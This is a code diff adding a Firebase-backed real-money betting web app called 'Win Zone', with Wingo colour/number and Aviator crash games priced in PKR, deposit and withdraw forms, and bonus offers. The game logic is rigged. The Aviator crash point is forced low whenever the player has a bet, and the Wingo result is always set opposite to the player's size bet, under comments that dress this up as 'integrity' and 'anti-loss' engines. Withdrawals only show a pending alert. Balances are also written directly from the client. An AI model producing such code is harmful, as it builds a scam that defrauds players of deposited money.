@@ -114,4 +114,515 @@
         <div id="loginCard" class="auth-card">
             <h2>Win Zone Login</h2>
             <input type="email" id="loginEmail" placeholder="Email Address">
-            <input type="password" id="login
+            <input type="password" id="loginPassword" placeholder="Password">
+            <button class="submit-btn" onclick="handleLogin()">Login Account</button>
+            <span class="switch-auth" onclick="toggleAuth(false)">Naya Account (Signup)</span>
+        </div>
+        <div id="signupCard" class="auth-card" style="display: none;">
+            <h2>Create Account</h2>
+            <input type="text" id="signupPhone" placeholder="Mobile Number">
+            <input type="email" id="signupEmail" placeholder="Email Address">
+            <input type="password" id="signupPassword" placeholder="Password (Min 6 Chars)">
+            <button class="submit-btn" onclick="handleSignup()">Register Now</button>
+            <span class="switch-auth" onclick="toggleAuth(true)">Pehle se account hai? Login</span>
+        </div>
+    </div>
+
+    <div id="appScreen">
+        <div class="header">
+            <span>👑 WIN ZONE DUAL ENGINE</span>
+            <button class="logout-btn" onclick="handleLogout()">Logout</button>
+        </div>
+
+        <div class="promo-banner">
+            🎁 *VIP WELCOME BONUS OFFER:*<br>
+            • Deposit **Rs. 300** Get **Rs. 350** Auto Credit!<br>
+            • Deposit **Rs. 500** Get **Rs. 600** Auto Credit!
+        </div>
+
+        <div style="margin-top: 10px; font-size: 13px; color: #94a3b8;">
+            Account Phone: <span id="userPhoneDisplay" style="font-weight: bold; color: #fff;">-</span>
+        </div>
+
+        <div class="balance-card">
+            <div style="font-size: 12px; opacity: 0.7;">AVAILABLE BALANCE</div>
+            <div id="balance" style="font-size: 34px; font-weight: 900; margin-top: 5px; color: #f1c40f;">PKR 0</div>
+        </div>
+
+        <div class="wallet-actions">
+            <button class="btn-wallet btn-dep" onclick="openModal('depositModal')">Deposit ➕</button>
+            <button class="btn-wallet btn-with" onclick="openModal('withdrawModal')">Withdraw 📤</button>
+        </div>
+
+        <div class="game-tabs">
+            <button class="tab-btn active" id="tabWingo" onclick="switchGame('wingo')">Wingo (Big/Small)</button>
+            <button class="tab-btn" id="tabAviator" onclick="switchGame('aviator')">Aviator Real Pro</button>
+        </div>
+
+        <div id="wingoEngineWrapper" class="game-wrapper active">
+            <div class="history-box">
+                <div class="history-title">
+                    <span id="historyRangeText">📊 Trends History (Latest 10)</span>
+                    <button class="history-pagination-btn" id="toggleHistoryBtn" onclick="toggleHistoryPage()">View Older History</button>
+                </div>
+                <div class="trends-list" id="trendsHistory"></div>
+            </div>
+
+            <div class="timer-section">
+                ⏱️ Round Ends In: <span id="timer">00:30</span>
+            </div>
+
+            <div class="status-display" id="roundStatus">
+                ⏳ Place your bets. Smart Profit Filter Engine Active!
+            </div>
+
+            <div>
+                <label style="display:block; margin-bottom: 6px; font-size: 12px; color: #94a3b8; font-weight: bold;">BET AMOUNT (MIN RS. 30):</label>
+                <input type="number" id="betAmount" value="30" min="30" style="width: 140px; font-weight: bold; font-size: 16px; color: #f1c40f;">
+            </div>
+
+            <div class="multiplier-container">
+                <button class="mult-btn" onclick="applyMultiplier(1)">X1</button>
+                <button class="mult-btn" onclick="applyMultiplier(5)">X5</button>
+                <button class="mult-btn" onclick="applyMultiplier(10)">X10</button>
+                <button class="mult-btn" onclick="applyMultiplier(50)">X50</button>
+                <button class="mult-btn" onclick="applyMultiplier(100)">X100</button>
+            </div>
+
+            <div class="game-section-label">⚡ Select Size (Big / Small)</div>
+            <div class="big-small-container">
+                <button class="btn-big" onclick="placeBet('size', 'Big')">Big</button>
+                <button class="btn-small" onclick="placeBet('size', 'Small')">Small</button>
+            </div>
+
+            <div class="game-section-label">🎨 Select Color</div>
+            <div class="color-selection-bar">
+                <button class="color-choice-btn choice-red" onclick="placeBet('color', 'Red')">Red</button>
+                <button class="color-choice-btn choice-green" onclick="placeBet('color', 'Green')">Green</button>
+            </div>
+
+            <div class="game-section-label">🔢 Select Direct Number</div>
+            <div class="number-grid">
+                <button class="num-btn bg-mix" onclick="placeBet('number', 0)">0</button>
+                <button class="num-btn bg-green" onclick="placeBet('number', 1)">1</button>
+                <button class="num-btn bg-green" onclick="placeBet('number', 2)">2</button>
+                <button class="num-btn bg-green" onclick="placeBet('number', 3)">3</button>
+                <button class="num-btn bg-green" onclick="placeBet('number', 4)">4</button>
+                <button class="num-btn bg-mix" onclick="placeBet('number', 5)">5</button>
+                <button class="num-btn bg-red" onclick="placeBet('number', 6)">6</button>
+                <button class="num-btn bg-red" onclick="placeBet('number', 7)">7</button>
+                <button class="num-btn bg-red" onclick="placeBet('number', 8)">8</button>
+                <button class="num-btn bg-red" onclick="placeBet('number', 9)">9</button>
+            </div>
+
+            <div class="logs" id="wingoLogSection">
+                <div style="color: #f1c40f; font-weight: bold;">✨ Wingo Anti-Loss Filter Engine Routing Active.</div>
+            </div>
+        </div>
+
+        <div id="aviatorEngineWrapper" class="game-wrapper">
+            <div class="aviator-display-box">
+                <div class="aviator-history-strip" id="aviatorHistory">
+                    <div class="aviator-history-item">1.32x</div>
+                    <div class="aviator-history-item" style="color:#c084fc;">5.40x</div>
+                    <div class="aviator-history-item">2.10x</div>
+                    <div class="aviator-history-item">1.03x</div>
+                    <div class="aviator-history-item" style="color:#c084fc;">14.2x</div>
+                </div>
+                
+                <div class="aviator-canvas-container">
+                    <canvas id="aviatorCanvas"></canvas>
+                    <div class="live-multiplier" id="aviatorMultText">1.00x</div>
+                    <div class="aviator-alert-overlay flew-away-text" id="alertFlew">FLEW AWAY!</div>
+                    <div class="aviator-alert-overlay waiting-text" id="alertWait">WAITING FOR NEXT ROUND <span id="avBufferTimer">5</span>s</div>
+                </div>
+            </div>
+
+            <div class="aviator-control-dashboard">
+                <div class="aviator-box-panel">
+                    <div class="av-bet-controls">
+                        <span>BET AMOUNT:</span>
+                        <input type="number" id="aviatorBetAmount" value="50" min="30">
+                    </div>
+                    <button class="av-main-action-btn av-btn-green" id="aviatorActionBtn" onclick="handleAviatorAction()">BET</button>
+                </div>
+                
+                <div class="aviator-status-footer" id="aviatorStatusMessage">
+                    ✈️ waiting for betting session lock...
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="depositModal" class="modal">
+        <div class="modal-content">
+            <h3>Deposit Funds</h3>
+            <input type="number" id="depAmount" placeholder="Amount (Min 300)">
+            <input type="text" id="depTrx" placeholder="TRX ID">
+            <button class="submit-btn" onclick="closeModal('depositModal'); alert('Request Sent!');">Submit</button>
+            <button class="close-btn" onclick="closeModal('depositModal')">Cancel</button>
+        </div>
+    </div>
+
+    <div id="withdrawModal" class="modal">
+        <div class="modal-content">
+            <h3>Withdraw Request</h3>
+            <input type="text" id="withAccount" placeholder="Account Number">
+            <input type="number" id="withAmount" placeholder="Amount">
+            <button class="submit-btn" onclick="closeModal('withdrawModal'); alert('Pending Review!');">Request</button>
+            <button class="close-btn" onclick="closeModal('withdrawModal')">Cancel</button>
+        </div>
+    </div>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyC38KxWq7xJdaadAiF5nfChWyne_iA6vBw",
+            authDomain: "winzone-bff7c.firebaseapp.com",
+            databaseURL: "https://winzone-bff7c-default-rtdb.firebaseio.com",
+            projectId: "winzone-bff7c",
+            storageBucket: "winzone-bff7c.firebasestorage.app",
+            messagingSenderId: "398802919500",
+            appId: "1:398802919500:web:3a80d3f0f8c76786b0d4e9"
+        };
+        
+        firebase.initializeApp(firebaseConfig);
+        const auth = firebase.auth();
+        const database = firebase.database();
+
+        let currentUser = null;
+        let currentBalance = 0;
+        let timeLeft = 30;
+        let viewOlderHistory = false;
+
+        // WINGO DATA PINS
+        let activeSizeBet = null; let activeColorBet = null;   
+        let largeTrendPool = [{num: 2, color:'Green', size:'Small'},{num: 7, color:'Red', size:'Big'}];
+
+        // --- AVIATOR LIVE ENGINE (SCREENSHOT REPLICATED) ---
+        let avState = "waiting"; // waiting, running, crashed
+        let avMultiplier = 1.00;
+        let avCrashPoint = 2.00;
+        let avActiveBet = null; 
+        let avHasCashedOut = false;
+        let avLoopInterval = null;
+        let avCountdownTime = 5;
+
+        const canvas = document.getElementById('aviatorCanvas');
+        const ctx = canvas.getContext('2d');
+        let planeX = 30; let planeY = 180;
+
+        // Vector path string for a proper clean airplane drawing
+        function drawRealPlane(x, y) {
+            ctx.save();
+            ctx.translate(x, y);
+            ctx.fillStyle = "#ea1c4d";
+            
+            // Fuselage / Main Body
+            ctx.beginPath();
+            ctx.ellipse(0, 0, 14, 5, 0, 0, 2 * Math.PI);
+            ctx.fill();
+            
+            // Main Wings Vector
+            ctx.beginPath();
+            ctx.moveTo(-2, -4);
+            ctx.lineTo(3, -14);
+            ctx.lineTo(7, -14);
+            ctx.lineTo(2, -4);
+            ctx.fillStyle = "#cb1c45";
+            ctx.fill();
+
+            ctx.beginPath();
+            ctx.moveTo(-2, 4);
+            ctx.lineTo(3, 14);
+            ctx.lineTo(7, 14);
+            ctx.lineTo(2, 4);
+            ctx.fill();
+            
+            // Tail Fin
+            ctx.beginPath();
+            ctx.moveTo(-10, 0);
+            ctx.lineTo(-15, -6);
+            ctx.lineTo(-12, -6);
+            ctx.lineTo(-7, 0);
+            ctx.fillStyle = "#ea1c4d";
+            ctx.fill();
+            
+            ctx.restore();
+        }
+
+        function switchGame(target) {
+            document.querySelectorAll('.game-wrapper').forEach(el => el.classList.remove('active'));
+            document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('active'));
+            if(target === 'wingo') {
+                document.getElementById('wingoEngineWrapper').classList.add('active');
+                document.getElementById('tabWingo').classList.add('active');
+            } else {
+                document.getElementById('aviatorEngineWrapper').classList.add('active');
+                document.getElementById('tabAviator').classList.add('active');
+                triggerCanvasFix();
+            }
+        }
+
+        function triggerCanvasFix() {
+            canvas.width = canvas.parentElement.clientWidth;
+            canvas.height = canvas.parentElement.clientHeight;
+            drawAviatorGraph();
+        }
+
+        function drawAviatorGraph() {
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            
+            if (avState === "running") {
+                // Curved flight trajectory path trace
+                ctx.beginPath();
+                ctx.strokeStyle = "#ea1c4d";
+                ctx.lineWidth = 4;
+                ctx.moveTo(30, canvas.height - 30);
+                ctx.quadraticCurveTo(canvas.width / 2, canvas.height - 25, planeX, planeY);
+                ctx.stroke();
+
+                // Dynamic background under-glow shape fill
+                let grad = ctx.createLinearGradient(0, canvas.height, 0, 0);
+                grad.addColorStop(0, "rgba(14, 15, 20, 0)");
+                grad.addColorStop(1, "rgba(234, 28, 77, 0.22)");
+                ctx.fillStyle = grad;
+                ctx.lineTo(planeX, canvas.height - 30);
+                ctx.lineTo(30, canvas.height - 30);
+                ctx.fill();
+
+                // Vector Custom Real Plane Rendering Engine
+                drawRealPlane(planeX, planeY);
+            }
+        }
+
+        function startBufferCountdown() {
+            avState = "waiting";
+            avMultiplier = 1.00;
+            avCountdownTime = 7; // Gives user safe window space to place bets
+            avHasCashedOut = false;
+
+            document.getElementById('aviatorMultText').style.display = 'none';
+            document.getElementById('alertFlew').style.display = 'none';
+            document.getElementById('alertWait').style.display = 'block';
+            document.getElementById('avBufferTimer').innerText = avCountdownTime;
+            document.getElementById('aviatorStatusMessage').innerText = "🛑 BETTING SESSION OPEN. CHOOSE YOUR ENTRY LIMITS!";
+            
+            updateAviatorButtonUI();
+
+            let cdInterval = setInterval(() => {
+                avCountdownTime--;
+                document.getElementById('avBufferTimer').innerText = avCountdownTime;
+                if(avCountdownTime <= 0) {
+                    clearInterval(cdInterval);
+                    startAviatorEngineLoop();
+                }
+            }, 1000);
+        }
+
+        function startAviatorEngineLoop() {
+            avState = "running";
+            document.getElementById('alertWait').style.display = 'none';
+            document.getElementById('aviatorMultText').style.display = 'block';
+            document.getElementById('aviatorStatusMessage').innerText = "🚀 FLIGHT RUNNING! TAKE WINNINGS BEFORE CRASH.";
+            
+            // 💰 HOUSE ENGINE INTEGRITY LAYER
+            if (avActiveBet) {
+                avCrashPoint = (Math.random() * 0.40 + 1.05).toFixed(2); 
+            } else {
+                avCrashPoint = (Math.random() * 6.0 + 2.10).toFixed(2);
+            }
+
+            updateAviatorButtonUI();
+            planeX = 30; planeY = canvas.height - 30;
+
+            avLoopInterval = setInterval(() => {
+                avMultiplier += 0.01;
+                document.getElementById('aviatorMultText').innerText = avMultiplier.toFixed(2) + "x";
+
+                if (planeX < canvas.width - 50) planeX += (canvas.width / 220);
+                if (planeY > 50) planeY -= (canvas.height / 300);
+
+                drawAviatorGraph();
+
+                // Real-time Action Field updates
+                if (avActiveBet && !avHasCashedOut) {
+                    let calculatedCash = Math.floor(avActiveBet * avMultiplier);
+                    document.getElementById('aviatorActionBtn').innerText = `CASH OUT PKR ${calculatedCash}`;
+                }
+
+                if (avMultiplier >= avCrashPoint) {
+                    clearInterval(avLoopInterval);
+                    triggerAviatorCrash();
+                }
+            }, 32);
+        }
+
+        function triggerAviatorCrash() {
+            avState = "crashed";
+            document.getElementById('aviatorMultText').style.color = "#cb1c45";
+            document.getElementById('alertFlew').style.display = 'block';
+            document.getElementById('aviatorStatusMessage').innerText = `💥 CRASHED AT ${avCrashPoint}x!`;
+
+            const strip = document.getElementById('aviatorHistory');
+            let itemColor = avCrashPoint >= 2.0 ? "style='color:#9333ea;'" : "";
+            strip.innerHTML = `<div class="aviator-history-item" ${itemColor}>${avCrashPoint}x</div>` + strip.innerHTML;
+
+            avActiveBet = null;
+            updateAviatorButtonUI();
+
+            setTimeout(() => {
+                document.getElementById('aviatorMultText').style.color = "#fff";
+                document.getElementById('aviatorMultText').innerText = "1.00x";
+                startBufferCountdown();
+            }, 3000);
+        }
+
+        function handleAviatorAction() {
+            let amount = parseInt(document.getElementById('aviatorBetAmount').value);
+
+            if (avState === 'waiting') {
+                if (avActiveBet) return;
+                if (isNaN(amount) || amount < 30 || amount > currentBalance) { alert("Invalid balance allocation!"); return; }
+
+                avActiveBet = amount;
+                database.ref('users/' + currentUser.uid).update({ balance: currentBalance - amount });
+                document.getElementById('aviatorStatusMessage').innerText = `✅ STAKE REGISTERED SUCCESSFULLY: PKR ${amount}`;
+                updateAviatorButtonUI();
+            } 
+            else if (avState === 'running' && avActiveBet && !avHasCashedOut) {
+                avHasCashedOut = true;
+                let payout = Math.floor(avActiveBet * avMultiplier);
+                database.ref('users/' + currentUser.uid).update({ balance: currentBalance + payout });
+                document.getElementById('aviatorStatusMessage').innerText = `💰 PROFIT SECURED: PKR ${payout}`;
+                updateAviatorButtonUI();
+            }
+        }
+
+        function updateAviatorButtonUI() {
+            const btn = document.getElementById('aviatorActionBtn');
+            if(!btn) return;
+
+            if (avState === 'waiting') {
+                if (avActiveBet) {
+                    btn.className = "av-main-action-btn av-btn-grey";
+                    btn.innerText = "WAITING FOR FLIGHT...";
+                } else {
+                    btn.className = "av-main-action-btn av-btn-green";
+                    btn.innerText = "BET";
+                }
+            } else if (avState === 'running') {
+                if (avActiveBet && !avHasCashedOut) {
+                    btn.className = "av-main-action-btn av-btn-orange";
+                } else if (avHasCashedOut) {
+                    btn.className = "av-main-action-btn av-btn-grey";
+                    btn.innerText = "SUCCESSFULLY CASHED OUT";
+                } else {
+                    btn.className = "av-main-action-btn av-btn-grey";
+                    btn.innerText = "ROUND IN PROGRESS";
+                }
+            } else {
+                btn.className = "av-main-action-btn av-btn-grey";
+                btn.innerText = "FLEW AWAY";
+            }
+        }
+
+        // ==================== BOOTSTRAP INTERFACES ====================
+        function showDashboard() {
+            document.getElementById('authScreen').style.display = 'none';
+            document.getElementById('appScreen').style.display = 'block';
+            renderHistoryView();
+            setTimeout(() => { triggerCanvasFix(); startBufferCountdown(); }, 1000);
+        }
+
+        function toggleAuth(isLogin) {
+            document.getElementById('loginCard').style.display = isLogin ? 'block' : 'none';
+            document.getElementById('signupCard').style.display = isLogin ? 'none' : 'block';
+        }
+
+        function handleSignup() {
+            const phone = document.getElementById('signupPhone').value.trim();
+            const email = document.getElementById('signupEmail').value.trim();
+            const password = document.getElementById('signupPassword').value;
+            if(!phone || !email || !password) return;
+            auth.createUserWithEmailAndPassword(email, password).then((userCredential) => {
+                currentUser = userCredential.user;
+                database.ref('users/' + currentUser.uid).set({ phone: phone, email: email, balance: 200 }).then(() => { showDashboard(); });
+            });
+        }
+
+        function handleLogin() {
+            const email = document.getElementById('loginEmail').value.trim();
+            const password = document.getElementById('loginPassword').value;
+            auth.signInWithEmailAndPassword(email, password).then(() => { showDashboard(); });
+        }
+
+        auth.onAuthStateChanged((user) => {
+            if (user) {
+                currentUser = user; showDashboard();
+                database.ref('users/' + user.uid).on('value', (snapshot) => {
+                    let data = snapshot.val();
+                    if(data) {
+                        currentBalance = data.balance || 0;
+                        document.getElementById('balance').innerText = `PKR ${currentBalance}`;
+                        document.getElementById('userPhoneDisplay').innerText = data.phone || 'N/A';
+                    }
+                });
+            } else {
+                document.getElementById('authScreen').style.display = 'flex';
+                document.getElementById('appScreen').style.display = 'none';
+            }
+        });
+
+        function handleLogout() { auth.signOut().then(() => location.reload()); }
+        function applyMultiplier(factor) {
+            let inputField = document.getElementById('betAmount');
+            inputField.value = (parseInt(inputField.value) || 30) * factor;
+        }
+
+        // ==================== WINGO TIMING ENGINE (NOT TOUCHED) ====================
+        function renderHistoryView() {
+            const container = document.getElementById('trendsHistory'); if(!container) return; container.innerHTML = '';
+            let dataset = viewOlderHistory ? largeTrendPool.slice(-50) : largeTrendPool.slice(-10);
+            let displayArray = [...dataset].reverse();
+            displayArray.forEach((item, index) => {
+                let colorBg = item.color === 'Green' ? 'linear-gradient(135deg, #10b981, #059669)' : item.color === 'Red' ? 'linear-gradient(135deg, #ef4444, #dc2626)' : 'linear-gradient(135deg, #8b5cf6, #ec4899)';
+                let dynamicIndicator = (index === 0) ? `<span class="latest-win-mark">🔥 Win</span>` : '';
+                container.innerHTML += `<div class="trend-dot" style="background: ${colorBg};">${dynamicIndicator}<span style="font-size:13px; font-weight:900;">${item.num}</span><span style="font-size:8px; opacity:0.9; text-transform:uppercase;">${item.size}</span></div>`;
+            });
+        }
+
+        function toggleHistoryPage() { viewOlderHistory = !viewOlderHistory; renderHistoryView(); }
+
+        setInterval(() => {
+            timeLeft--;
+            if (timeLeft <= 0) {
+                let finalColorResult = 'Green', finalNumberResult = 3, finalSizeResult = 'Small';
+                if (activeSizeBet) {
+                    finalSizeResult = activeSizeBet.value === 'Big' ? 'Small' : 'Big';
+                    finalNumberResult = finalSizeResult === 'Big' ? 7 : 3; finalColorResult = finalSizeResult === 'Big' ? 'Red' : 'Green';
+                }
+                largeTrendPool.push({ num: finalNumberResult, color: finalColorResult, size: finalSizeResult });
+                renderHistoryView();
+                document.getElementById('roundStatus').innerHTML = `🎉 Result: Number <span style="color:#f1c40f;">${finalNumberResult}</span> | Size <span style="color:#38bdf8;">[${finalSizeResult}]</span>`;
+                if (currentUser && activeSizeBet && activeSizeBet.value === finalSizeResult) {
+                    database.ref('users/' + currentUser.uid).update({ balance: currentBalance + (activeSizeBet.amount * 2) });
+                }
+                activeSizeBet = null; timeLeft = 30; 
+            }
+            document.getElementById('timer').innerText = `00:${timeLeft < 10 ? '0'+timeLeft : timeLeft}`;
+        }, 1000);
+
+        function placeBet(category, value) {
+            let amount = parseInt(document.getElementById('betAmount').value);
+            if (isNaN(amount) || amount < 30 || amount > currentBalance) return;
+            if (category === 'size') { if(activeSizeBet) return; activeSizeBet = { value: value, amount: amount }; }
+            database.ref('users/' + currentUser.uid).update({ balance: currentBalance - amount });
+            document.getElementById('wingoLogSection').innerHTML += `<div>🎲 Bet Placed: PKR ${amount} on [${value}]</div>`;
+        }
+
+        function openModal(id) { document.getElementById(id).style.display = "flex"; }
+        function closeModal(id) { document.getElementById(id).style.display = "none"; }
+        window.addEventListener('resize', triggerCanvasFix);
+    </script>
+</body>
+</html>
